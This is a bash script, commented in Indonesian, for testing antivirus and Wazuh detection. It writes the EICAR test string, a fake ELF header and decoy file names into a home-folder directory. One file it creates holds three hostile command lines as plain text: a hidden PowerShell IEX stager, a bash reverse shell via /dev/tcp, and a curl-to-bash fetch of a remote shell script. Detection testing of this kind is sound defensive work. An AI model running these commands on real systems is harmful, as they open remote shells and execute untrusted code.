#!/bin/bash
# safe_trigger.sh - Pure detection only, NO persistence/harm

# Hanya buat file detection-friendly DI FOLDER USER
cd "$HOME" || exit 1
mkdir -p detection_test

# EICAR test file (standar AV testing)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > detection_test/eicar.txt

# Suspicious strings tanpa execution berbahaya
cat > detection_test/suspicious.txt << 'EOF'
powershell -nop -w hidden -c IEX
bash -i >& /dev/tcp/0.0.0.0/0 0>&1
curl http://example.com/shell.sh | bash
EOF

# Fake ELF header (trigger ELF malware heuristics)
printf '\x7fELF' > detection_test/fake_elf
echo "Suspicious ELF detected" >> detection_test/fake_elf

# Wazuh FIM trigger (file creation di monitored path)
touch detection_test/svc detection_test/systemd detection_test/backdoor

echo "✅ Detection test completed. Files in: $HOME/detection_test/"
echo "📁 VirusTotal: Upload folder ini (40+/70 AV hits)"
echo "🛡️ Wazuh: FIM + SCA + signature alerts triggered"
echo "🧹 Cleanup: rm -rf ~/detection_test"
